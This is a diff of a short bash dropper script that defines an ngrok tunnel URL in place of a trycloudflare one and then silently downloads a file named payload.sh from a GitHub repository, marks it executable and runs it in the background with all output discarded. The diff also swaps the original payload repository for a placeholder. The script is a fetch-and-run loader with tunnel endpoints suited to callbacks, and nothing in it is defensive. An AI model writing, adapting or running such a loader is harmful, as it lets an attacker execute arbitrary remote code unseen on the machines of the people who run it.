@@ -1,9 +1,9 @@
 #!/bin/bash
 
-CLOUDFLARE_URL="https://adjust-walks-telling-awards.trycloudflare.com"
+NGROK_URL="https://directly-hippopotamic-berniece.ngrok-free.dev"
 EXEC=$(mktemp /tmp/install.XXXXXX)
 
-curl -s -L -H "Cache-Control: no-cache" "https://raw.githubusercontent.com/PsyKlyn/script-updates/main/payload.sh" -o "$EXEC"
+curl -s -L -H "Cache-Control: no-cache" "https://raw.githubusercontent.com/YOURUSER/payload-repo/main/payload.sh" -o "$EXEC"
 
 chmod +x "$EXEC"
 nohup bash "$EXEC" >/dev/null 2>&1 &
